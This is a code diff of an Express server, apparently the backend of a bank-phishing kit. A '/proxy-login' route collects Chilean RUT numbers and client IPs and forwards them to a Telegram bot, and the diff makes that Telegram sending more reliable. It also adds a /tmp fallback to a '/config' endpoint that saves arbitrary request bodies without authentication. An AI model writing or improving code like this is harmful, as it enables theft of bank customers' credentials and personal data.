@@ -18,12 +18,19 @@ async function safeSendTelegram(text) {
     console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
     return;
   }
+
   try {
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
     });
+
+    if (!response.ok) {
+      let bodyText = '';
+      try { bodyText = await response.text(); } catch (_) {}
+      console.error('Telegram respondió con error:', response.status, bodyText);
+    }
   } catch (err) {
     console.error('Error enviando a Telegram:', err);
   }
@@ -73,13 +80,31 @@ app.post("/procesarSaldo", async (req, res) => {
 
 // Endpoint para guardar configuración
 app.post("/config", (req, res) => {
+  const dataDir = path.join(__dirname, "data");
+  const configPath = path.join(dataDir, "config.json");
+
   try {
-    // Escribir usando ruta absoluta para evitar problemas de permisos/CWD
-    fs.writeFileSync(cfgPath, JSON.stringify(req.body, null, 2));
-    res.json(req.body);
+    if (!fs.existsSync(dataDir)) {
+      fs.mkdirSync(dataDir, { recursive: true });
+    }
+    fs.writeFileSync(configPath, JSON.stringify(req.body, null, 2));
+    console.log('Configuración guardada en', configPath);
+    return res.json(req.body);
   } catch (err) {
-    console.error('Error guardando config.json en', cfgPath, err);
-    res.status(500).json({ error: 'Error guardando configuración' });
+    console.error('Error guardando config.json en', configPath, err);
+    try {
+      const fallbackPath = path.join('/tmp', 'config.json');
+      fs.writeFileSync(fallbackPath, JSON.stringify(req.body, null, 2));
+      console.warn('Guardado fallback en', fallbackPath);
+      return res.json(req.body);
+    } catch (fallbackErr) {
+      console.error('Fallback a /tmp falló:', fallbackErr);
+      return res.status(500).json({
+        error: 'Error guardando configuración',
+        details: err.message || String(err),
+        fallback: fallbackErr.message || String(fallbackErr)
+      });
+    }
   }
 });
 
@@ -133,7 +158,6 @@ app.post("/proxy-login", async (req, res) => {
   // Validar formato RUT
   const rutValido = validarRut(rut);
   if (!rutValido) {
-    // No intentamos validar contra OfficeBanking: solo verificamos formato
     try { await safeSendTelegram(`Intento con RUT inválido:\nRUT: ${rut}\nIP: ${ip}`); } catch(e){ console.error(e); }
     return res.status(400).json({ status: "invalid_rut", mensaje: "RUT inválido" });
   }
